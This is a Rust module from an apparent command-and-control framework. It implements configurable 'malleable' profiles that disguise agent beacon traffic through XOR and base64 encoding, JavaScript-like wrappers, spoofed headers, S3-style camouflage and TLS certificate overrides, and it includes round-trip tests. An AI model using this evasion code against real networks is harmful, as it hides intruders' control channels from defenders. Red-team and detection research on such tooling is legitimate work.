//! Malleable C2 profile — TOML-configurable traffic shaping and body transforms.
//!
//! A `MalleableProfile` loaded from TOML implements `ListenerProfile` so it can be
//! used anywhere a built-in profile is expected, while also providing `encode`/`decode`
//! helpers used by the agent transport and server handlers.

use anyhow::{Context, Result};
use base64::Engine;
use serde::{Deserialize, Serialize};

use crate::profile::ListenerProfile;

// ─── Sub-structs ─────────────────────────────────────────────────────────────

/// Profile identity metadata.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProfileMetadata {
    pub name: String,
    #[serde(default)]
    pub description: Option<String>,
}

/// A single custom HTTP header entry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpHeader {
    pub name: String,
    pub value: String,
}

/// Transform pipeline applied to a request or response body.
///
/// **Encode pipeline** (used by agent for POST bodies, server for GET responses):
/// `raw → xor? → base64/base64url? → prepend+append → String`
///
/// **Decode pipeline** (inverse):
/// `String → strip prepend+append → base64/base64url decode → xor? → raw`
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct TransformConfig {
    /// Apply standard Base64 encoding (default: `false` — plain UTF-8 pass-through).
    #[serde(default)]
    pub base64: bool,
    /// Use URL-safe Base64 (no `+`/`/`, no padding) instead of standard Base64.
    /// Takes precedence over `base64` if both are `true`.
    #[serde(default)]
    pub base64url: bool,
    /// XOR each byte with this cyclic key, expressed as a hex string (e.g. `"deadbeef"`).
    #[serde(default)]
    pub xor: Option<String>,
    /// Literal string prepended to the encoded output.
    #[serde(default)]
    pub prepend: Option<String>,
    /// Literal string appended to the encoded output.
    #[serde(default)]
    pub append: Option<String>,
    /// If set, the data should be placed in this query-parameter rather than the body.
    /// (Informational — the transport layer is responsible for honouring this.)
    #[serde(default)]
    pub parameter: Option<String>,
}

impl TransformConfig {
    /// Returns `true` when no transformation is applied (identity pass-through).
    pub fn is_identity(&self) -> bool {
        !self.base64
            && !self.base64url
            && self.xor.is_none()
            && self.prepend.is_none()
            && self.append.is_none()
    }

    /// Encode raw bytes for HTTP transmission.
    ///
    /// Pipeline: `raw → xor? → base64/base64url? → prepend+append`
    pub fn encode(&self, raw: &[u8]) -> Result<String> {
        let mut data = raw.to_vec();

        // Step 1 — XOR (cyclic key)
        if let Some(hex) = &self.xor {
            let key = hex_to_bytes(hex).context("invalid xor key")?;
            if !key.is_empty() {
                for (i, b) in data.iter_mut().enumerate() {
                    *b ^= key[i % key.len()];
                }
            }
        }

        // Step 2 — Base64 encode
        let mut s: String = if self.base64url {
            base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&data)
        } else if self.base64 {
            base64::engine::general_purpose::STANDARD.encode(&data)
        } else {
            String::from_utf8(data)
                .context("raw bytes are not valid UTF-8; set base64 = true in the profile")?
        };

        // Step 3 — Prepend / Append
        if let Some(pre) = &self.prepend {
            s = format!("{}{}", pre, s);
        }
        if let Some(app) = &self.append {
            s = format!("{}{}", s, app);
        }

        Ok(s)
    }

    /// Decode HTTP transmission data back to raw bytes (inverse of [`encode`](Self::encode)).
    ///
    /// Pipeline: `strip prepend+append → base64/base64url decode → xor?`
    pub fn decode(&self, data: &str) -> Result<Vec<u8>> {
        let mut s = data.to_string();

        // Step 1 — Strip prepend / append
        if let Some(pre) = &self.prepend {
            s = s
                .strip_prefix(pre.as_str())
                .with_context(|| format!("expected prepend {:?} not found in body", pre))?
                .to_string();
        }
        if let Some(app) = &self.append {
            s = s
                .strip_suffix(app.as_str())
                .with_context(|| format!("expected append {:?} not found in body", app))?
                .to_string();
        }

        // Step 2 — Base64 decode
        let mut bytes: Vec<u8> = if self.base64url {
            base64::engine::general_purpose::URL_SAFE_NO_PAD
                .decode(s.trim())
                .context("base64url decode failed")?
        } else if self.base64 {
            base64::engine::general_purpose::STANDARD
                .decode(s.trim())
                .context("base64 decode failed")?
        } else {
            s.into_bytes()
        };

        // Step 3 — XOR (self-inverse: same operation in both directions)
        if let Some(hex) = &self.xor {
            let key = hex_to_bytes(hex).context("invalid xor key")?;
            if !key.is_empty() {
                for (i, b) in bytes.iter_mut().enumerate() {
                    *b ^= key[i % key.len()];
                }
            }
        }

        Ok(bytes)
    }
}

/// Agent-side configuration for one HTTP verb block.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ClientConfig {
    /// Extra headers the agent injects into every matching request.
    #[serde(default)]
    pub headers: Vec<HttpHeader>,
    /// Body transform applied *before* the agent transmits data.
    #[serde(default)]
    pub output: TransformConfig,
}

/// Server-side configuration for one HTTP verb block.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ServerConfig {
    /// Extra headers the server injects into every matching response.
    #[serde(default)]
    pub headers: Vec<HttpHeader>,
    /// Body transform applied *before* the server transmits response data.
    #[serde(default)]
    pub output: TransformConfig,
}

/// One HTTP verb block — GET for polling, POST for register/result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpBlock {
    /// Base-path prefix prepended to `/register`, `/poll/{id}`, `/result/{id}`.
    pub uri: String,
    /// HTTP verb (`"GET"` or `"POST"`).
    pub verb: String,
    #[serde(default)]
    pub client: ClientConfig,
    #[serde(default)]
    pub server: ServerConfig,
}

impl Default for HttpBlock {
    fn default() -> Self {
        Self {
            uri: String::new(),
            verb: "GET".to_string(),
            client: ClientConfig::default(),
            server: ServerConfig::default(),
        }
    }
}

/// Optional TLS certificate identity override for HTTPS camouflage.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct CertConfig {
    pub cn: Option<String>,
    pub o: Option<String>,
    pub ou: Option<String>,
    pub country: Option<String>,
}

/// In-memory staging configuration (future use).
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct StageConfig {
    /// XOR-mask beacon memory during sleep (planned feature).
    #[serde(default)]
    pub sleep_mask: Option<bool>,
}

// ─── MalleableProfile ────────────────────────────────────────────────────────

/// A fully-configurable Malleable C2 profile loaded from TOML.
///
/// # Minimal TOML example
/// ```toml
/// [metadata]
/// name = "amazon"
/// description = "Amazon S3 camouflage"
///
/// [http_get]
/// uri = "/s"
/// verb = "GET"
///
/// [http_get.client.output]
/// base64url = true
///
/// [http_get.server.output]
/// base64url = true
/// prepend = "var _g = '"
/// append = "';"
///
/// [http_post]
/// uri = "/s/shopping-cart-items"
/// verb = "POST"
///
/// [http_post.client.output]
/// base64url = true
/// ```
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MalleableProfile {
    pub metadata: ProfileMetadata,
    /// GET traffic block: agent polling requests and their server responses.
    pub http_get: HttpBlock,
    /// POST traffic block: register and result-submission requests.
    pub http_post: HttpBlock,
    #[serde(default)]
    pub https_certificate: Option<CertConfig>,
    #[serde(default)]
    pub stage: Option<StageConfig>,
}

impl MalleableProfile {
    /// Parse a profile from a TOML string.
    pub fn from_str(s: &str) -> Result<Self> {
        toml::from_str(s).context("failed to parse malleable profile TOML")
    }

    /// Load a profile from a TOML file on disk.
    pub fn from_file(path: &str) -> Result<Self> {
        let s = std::fs::read_to_string(path)
            .with_context(|| format!("cannot read malleable profile file {:?}", path))?;
        Self::from_str(&s)
    }

    // ── Convenience shims ────────────────────────────────────────────────────

    /// Encode a poll response body (server → agent, uses `http_get.server.output`).
    pub fn encode_poll_response(&self, raw: &[u8]) -> Result<String> {
        self.http_get.server.output.encode(raw)
    }

    /// Decode a poll response body received by the agent (uses `http_get.server.output`).
    pub fn decode_poll_response(&self, data: &str) -> Result<Vec<u8>> {
        self.http_get.server.output.decode(data)
    }

    /// Encode a POST request body before the agent sends it (uses `http_post.client.output`).
    pub fn encode_post_body(&self, raw: &[u8]) -> Result<String> {
        self.http_post.client.output.encode(raw)
    }

    /// Decode a POST request body received by the server (uses `http_post.client.output`).
    pub fn decode_post_body(&self, data: &str) -> Result<Vec<u8>> {
        self.http_post.client.output.decode(data)
    }

    /// Returns `true` if neither GET responses nor POST request bodies are transformed.
    pub fn is_passthrough(&self) -> bool {
        self.http_get.server.output.is_identity()
            && self.http_post.client.output.is_identity()
    }
}

impl ListenerProfile for MalleableProfile {
    fn name(&self) -> &str {
        &self.metadata.name
    }

    /// Uses `http_get.uri` as the route base-path prefix for register/poll/result.
    fn base_path(&self) -> &str {
        &self.http_get.uri
    }

    /// Returns the first `User-Agent` entry from `http_get.client.headers`, if any.
    fn user_agent(&self) -> Option<&str> {
        self.http_get
            .client
            .headers
            .iter()
            .find(|h| h.name.eq_ignore_ascii_case("user-agent"))
            .map(|h| h.value.as_str())
    }
}

// ─── Internal helpers ────────────────────────────────────────────────────────

fn hex_to_bytes(hex: &str) -> Result<Vec<u8>> {
    if hex.len() % 2 != 0 {
        anyhow::bail!("hex string has odd length ({})", hex.len());
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| {
            u8::from_str_radix(&hex[i..i + 2], 16)
                .with_context(|| format!("invalid hex byte at position {}", i))
        })
        .collect()
}

// ─── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn identity_roundtrip() {
        let cfg = TransformConfig::default();
        assert!(cfg.is_identity());
        let raw = b"hello world";
        let enc = cfg.encode(raw).unwrap();
        assert_eq!(enc, "hello world");
        assert_eq!(cfg.decode(&enc).unwrap(), raw);
    }

    #[test]
    fn base64_roundtrip() {
        let cfg = TransformConfig { base64: true, ..Default::default() };
        let raw = b"{\"cmd_id\":\"abc\",\"stdout\":\"test output\"}";
        let enc = cfg.encode(raw).unwrap();
        assert_eq!(cfg.decode(&enc).unwrap(), raw);
    }

    #[test]
    fn base64url_roundtrip() {
        let cfg = TransformConfig { base64url: true, ..Default::default() };
        let raw = b"\x00\x01\x02\xfe\xff";
        let enc = cfg.encode(raw).unwrap();
        assert!(!enc.contains('+'), "base64url should not contain '+'");
        assert!(!enc.contains('/'), "base64url should not contain '/'");
        assert_eq!(cfg.decode(&enc).unwrap(), raw);
    }

    #[test]
    fn xor_plus_base64_roundtrip() {
        let cfg = TransformConfig {
            base64: true,
            xor: Some("deadbeef".to_string()),
            ..Default::default()
        };
        let raw = b"secret C2 payload";
        assert_eq!(cfg.decode(&cfg.encode(raw).unwrap()).unwrap(), raw);
    }

    #[test]
    fn prepend_append_roundtrip() {
        let cfg = TransformConfig {
            base64: true,
            prepend: Some("var _c='".to_string()),
            append: Some("';".to_string()),
            ..Default::default()
        };
        let raw = b"agent payload";
        let enc = cfg.encode(raw).unwrap();
        assert!(enc.starts_with("var _c='"), "must start with prepend");
        assert!(enc.ends_with("';"), "must end with append");
        assert_eq!(cfg.decode(&enc).unwrap(), raw);
    }

    #[test]
    fn full_chain_roundtrip() {
        let cfg = TransformConfig {
            base64: true,
            xor: Some("cafebabe".to_string()),
            prepend: Some("//BEGIN//".to_string()),
            append: Some("//END//".to_string()),
            ..Default::default()
        };
        let raw = b"full transform chain test payload";
        assert_eq!(cfg.decode(&cfg.encode(raw).unwrap()).unwrap(), raw);
    }

    #[test]
    fn parse_profile_toml() {
        let s = r#"
[metadata]
name = "test_profile"
description = "Unit test profile"

[http_get]
uri = "/api"
verb = "GET"

[[http_get.client.headers]]
name = "User-Agent"
value = "Mozilla/5.0 Test"

[http_get.server.output]
base64url = true
prepend = "var _g='"
append = "';"

[http_post]
uri = "/api"
verb = "POST"

[http_post.client.output]
base64url = true
"#;
        let p = MalleableProfile::from_str(s).unwrap();
        assert_eq!(p.name(), "test_profile");
        assert_eq!(p.base_path(), "/api");
        assert_eq!(p.user_agent(), Some("Mozilla/5.0 Test"));
        assert!(!p.is_passthrough());
    }

    #[test]
    fn poll_response_roundtrip() {
        let s = r#"
[metadata]
name = "roundtrip"

[http_get]
uri = ""
verb = "GET"

[http_get.server.output]
base64url = true
prepend = "/*"
append = "*/"

[http_post]
uri = ""
verb = "POST"
"#;
        let p = MalleableProfile::from_str(s).unwrap();
        let json = b"{\"command\":null,\"tunnel_frames\":[]}";
        let encoded = p.encode_poll_response(json).unwrap();
        assert!(encoded.starts_with("/*"));
        let decoded = p.decode_poll_response(&encoded).unwrap();
        assert_eq!(decoded, json);
    }
}
